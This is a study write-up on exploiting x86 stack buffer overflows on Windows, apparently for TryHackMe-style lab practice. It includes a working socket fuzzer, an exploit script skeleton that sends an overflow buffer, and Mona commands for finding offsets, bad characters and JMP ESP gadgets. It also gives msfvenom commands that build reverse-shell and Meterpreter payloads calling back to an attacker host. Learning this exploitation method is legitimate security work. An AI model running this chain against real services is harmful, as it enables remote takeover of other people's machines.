# x86 Stack Overflow

The writeup is based on **x86 architecture**. 

Below is a breakdown of how memory is allocated for a program. [image credit](http://riseandhack.blogspot.com/2014/04/understanding-stack-precusor-to.html)

<img src="http://1.bp.blogspot.com/-r3sr9vMjUss/Uz3QWckr-FI/AAAAAAAAAEI/fyZoieLZ4FI/s1600/Stack.jpg">

The **stack** grows downwards and **heap** grows upwards for x86. We focus on overflowing the stack in this writeup. 

===> note that "the top of the stack" refers to the <ins>lower memory address</ins> where stack grows (from function calls). 
 
## Core Idea
Look at **one stack frame**. The idea is that we want to overflow the entire buffer in the frame, and write to the EIP - where <ins>the address of first byte of the next instruction</ins> to be executed is. So when the function is about to return, instead of returning, we want to use EIP to point the CPU to the start of our malicious payload (or the start of the nop sled if padded). **The payload is in ESP**, which is a stack pointer that holds the address of the most-recently pushed value on the stack. How do we do that?

We pass the following to the program function: 
```
filler (to overflow the buffer and EBP but stop before hitting EIP) + 
address of JMP ESP (4 bytes, want this to be in EIP) + 
nop sled (\x090 of some amounts) +
shellcode
```
The key is to use `JMP ESP`, which asks the program to make a jump to the content of ESP - that is, to the start of our payload. Then, the value in ESP gets executed (NOPs + Shellcode). 

## General Steps
1. Spiking - identify **what function** is vulnerable for overflow
2. Fuzzing - use the function found in spiking, find out **the ballpark of the number of characters that would break the program**
3. Finding the Offset to EIP with bytearray, to determine **the length of the filler**. To confirm the offset is correct, pass "filler" + "BBBB" to the function, and we should expect to see `42424242` in EIP (`42` is the hex of `B`) and nothing in ESP. 
4. Finding "Bad Characters". These characters have special meanings to the program, so we **don't want them present in the memory address of our `JMP ESP` pointer and our payload**. 
5. Find **the address of `JMP ESP`** from a module that's currently running & compiled without memory protections (e.g. ASLR, rebase). Exclude the ones with bad characters. 
7. Prepare the payload in hex; specified the x86 architecture, output language, and exclude the use of bad characters. 
8. Exploiting the System with `filler + jmp_esp_return + nop + payload`

## 🛠️ Detail Instructions
Based on
* [Tib3rius: TryHackMe BOF Prep](https://tryhackme.com/room/bufferoverflowprep)
* [TCM: Teaching my Wife Buffer Overflows](https://youtu.be/5NB2laaILEA)

Tool: Immunity Debugger and Mona

### Mona Config
```
!mona config -set workingfolder c:\mona\%p
```
* `%p` is the process name
* when running `mona compare` later on, remember to update the file path

### > Fuzzing

Create a file on Kali called `fuzzer.py`:

```
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = "PORT"
timeout = 5
prefix = "OVERFLOW1 "  # depends on program function

string = prefix + "A" * 100  # 100 increments

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

### > Find EIP Offset

Bytearray generation
```
$ msf-pattern_create -l <size>
```

Create another file `exploit.py`. Put the bytearray into `payload`, and see what charaters are in `EIP` 
```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
return = ""
padding = ""
payload = ""

buffer = prefix + overflow + return + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
 ```
 
 Find the offset with Mona (preferred, as it gets you offset for ESP and others as well)
 ```
 !mona findmsp -distance 2000
 ```
 >  The findmsp command will find all instances or certain references to a cyclic pattern (a.k.a. “Metasploit pattern”) in memory, registers, etc.
 
 Or, find the offset with Metasploit
 ```
 $ msf-pattern_offset -l 2000 -q <EIP>
 
 # example
msf-pattern_offset -l 2000 -q 6F43396E
[*] Exact match at offset 1978
 ```
 Sometimes it doesn't give you the exact offset. So Mona helps (EIP offset shoudl be ESP offset minus 4). 
 ```
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 634 (adjusted [ little-endian: 2 | big-endian: 1044482 ] ) byte offset 0
[+] Possible match at offset 694 (adjusted [ little-endian: -33554432 | big-endian: -32509952 ] ) byte offset 3

 ```
 
 To test if this offset is correct, remove payload. Update `offset` to offset number and return to `BBBB`. Expect to see EIP with `42424242` and nothing in ESP. 
 
 ### > Find Bad Characters
 
 Null byte is removed already.
 
 ```
 badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

set the `payload` to the string of bad chars (so this is in ESP when the program breaks), and run that against the program. 

To manually compare to find bad characters, you can right click on ESP register in Immunity Debugger and click `follow dump` 

Easier way is to use `mona`. 

First, generate a bytearray excluding bad characters. 
```
!mona bytearray -b "\x00"
```
Make comparisons
```
!mona compare -f C:\mona\<replace-with-process-name>\bytearray.bin -a <ESP-address>
```
> "Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string."

For example, if you see `\x2e \x2f` are listed as bad char, chances are, `\x2f` is alright. 

Next, remove the bad characters in Python script and go through the above excercise again. If Mona shows `not modified` then all bad characters have been found. 

### > Find `JMP ESP`

Find all `JMP ESP` with addresses that don't contain any of the badchars
```
!mona jmp -r esp -cpb "\x00"
```
* The jmp command will, by default, ignore any modules that have memory protections (i.e. ASLR or REBASE... can run`!mona modules` to verify)
* pick any one of them. We can verify this memory location is `JMP ESP` by searching the address using the icon that looks like a black door. 
* Write this mem addr in reverse into `return` (due to little endien)
  * so if the mona show `0x625011af` we write `\xaf\x11\x50\x62` to `return`

### > Generate Payload
```
# shell only
$ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -a x86 -b "\x00" -f c

# x86 meterpreter (use a staged one!!!)
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -a x86 -b "\x00" -f c
```
* export file type is C
* paste this into payload

### > Exploiting 

Run `exploit.py`
